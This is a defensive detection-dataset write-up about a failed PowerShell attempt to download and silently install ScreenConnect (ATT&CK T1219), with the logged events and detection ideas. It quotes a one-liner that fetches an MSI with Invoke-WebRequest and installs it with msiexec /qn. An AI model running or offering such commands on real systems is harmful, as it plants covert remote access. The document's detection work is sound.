# T1219-5: Remote Access Tools — ScreenConnect Application Download and Install on Windows

## Technique Context

T1219 Remote Access Tools focuses on the adversarial use of legitimate remote administration tools to establish persistent access and control over compromised systems. ScreenConnect (now known as ConnectWise Control) is a widely-used commercial remote access platform that provides screen sharing, file transfer, and remote control capabilities. While legitimate for IT support, threat actors frequently abuse these tools because they:

1. Appear benign to security tools and analysts
2. Provide full interactive access to compromised systems
3. Often bypass application whitelisting and network monitoring
4. Establish encrypted communication channels that are difficult to inspect

The detection community typically focuses on identifying suspicious installation patterns, unsigned executables, unusual network destinations, and installations from non-standard locations or by unexpected processes. This technique often appears in APT campaigns and ransomware deployment scenarios where attackers need reliable remote access for lateral movement and data exfiltration.

## What This Dataset Contains

This dataset captures a failed attempt to download and install ScreenConnect via PowerShell automation. The key events include:

**PowerShell Execution Chain (Security 4688 & Sysmon EID 1):**
- Initial PowerShell execution with command: `powershell.exe & {$installer = \"C:\Users\$env:username\Downloads\ScreenConnect.msi\"; Invoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\"; msiexec /i $installer /qn}`
- Child PowerShell process spawned to execute the script block

**Network Activity (Sysmon EID 22):**
- DNS query for `d1kuyuqowve5id.cloudfront.net` resolving to multiple CloudFront IP addresses
- This represents the attempt to reach the ScreenConnect download infrastructure

**Failed Download (PowerShell EID 4103 & 4100):**
- `Invoke-WebRequest` command execution logged with parameters showing target URL and output file path
- PowerShell error: "The remote server returned an error: (403) Forbidden" indicating the download was blocked

**MSI Installation Attempt (Security 4688 & Sysmon EID 1):**
- Two `msiexec.exe` processes spawned: one for installation (`/i C:\Users\ACME-WS02$\Downloads\ScreenConnect.msi /qn`) and one for version query (`/V`)
- Installation process exits with status code 0x653 (1619 - ERROR_INSTALL_PACKAGE_OPEN_FAILED)

**Application Events (EID 1040/1042):**
- Windows Installer transaction events showing the attempted MSI installation of ScreenConnect.msi

## What This Dataset Does Not Contain

The dataset lacks evidence of successful ScreenConnect installation due to the 403 Forbidden response from the download server. Missing elements include:

- No successful file download events (Sysmon EID 11 for the actual MSI file)
- No ScreenConnect service installation or startup events
- No network connections from an installed ScreenConnect client
- No registry modifications typically associated with ScreenConnect installation
- No installation directory creation under Program Files
- No ScreenConnect process execution beyond the failed MSI installer

The sysmon-modular configuration's include-mode filtering means some intermediate processes may not be captured, though the key PowerShell and msiexec processes are present due to their suspicious nature patterns.

## Assessment

This dataset provides excellent visibility into the attack attempt methodology despite the failed execution. The combination of Security 4688 command-line logging, PowerShell script block logging (EID 4104), and Sysmon process creation events creates a comprehensive view of the attack chain. The DNS resolution captured in Sysmon EID 22 is particularly valuable for network-based detection.

The failure scenario actually enhances the dataset's detection value by showing how security controls can disrupt attack chains while still generating rich telemetry. The 403 error suggests either network filtering or server-side access controls prevented the download, demonstrating defense-in-depth effectiveness.

The PowerShell logging is exceptionally detailed, capturing both the script execution (EID 4104) and command invocation details (EID 4103), providing multiple detection angles for this technique.

## Detection Opportunities Present in This Data

1. **PowerShell-based RAT installation detection** - Script blocks containing remote tool download URLs combined with silent MSI installation flags (`Invoke-WebRequest` + `msiexec /qn`)

2. **ScreenConnect infrastructure DNS queries** - Monitor for DNS requests to known ScreenConnect/ConnectWise infrastructure domains, particularly CloudFront CDN endpoints

3. **Silent MSI installation patterns** - Detection of `msiexec.exe` execution with `/qn` (quiet/no UI) flag, especially when combined with remote file downloads

4. **PowerShell web request to executable content** - `Invoke-WebRequest` commands targeting `.msi`, `.exe`, or other executable file extensions from external domains

5. **Command-line pattern matching** - Signatures for PowerShell one-liners that combine web requests and installation commands in a single execution block

6. **Process ancestry analysis** - PowerShell spawning MSI installer processes, particularly when the PowerShell command contains download functionality

7. **Failed download attempt detection** - Monitor PowerShell error events (EID 4100) indicating network access failures that may suggest blocked malicious activity

8. **Suspicious CloudFront usage** - Network connections to CloudFront infrastructure for software installation outside of known legitimate channels
